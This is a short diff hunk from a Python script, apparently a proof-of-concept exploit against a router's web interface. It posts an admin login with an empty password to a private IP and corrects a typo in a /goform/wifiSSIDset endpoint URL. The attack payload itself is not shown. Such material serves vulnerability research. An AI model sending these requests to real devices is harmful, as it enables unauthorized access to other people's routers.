@@ -40,7 +40,7 @@ p1 = 'usertype=admin&password=&time=2022;7;6;14;9;6&username='
 
 requests.post(target_url, headers = target_headers, data = p1, verify = False, timeout = 1)
 
-target_url = 'http://192.168.10.105/goform/wifiSSIDet'
+target_url = 'http://192.168.10.105/goform/wifiSSIDset'
 
 target_headers = {'Host' : '192.168.10.105',
 'Content-Length' : '295',
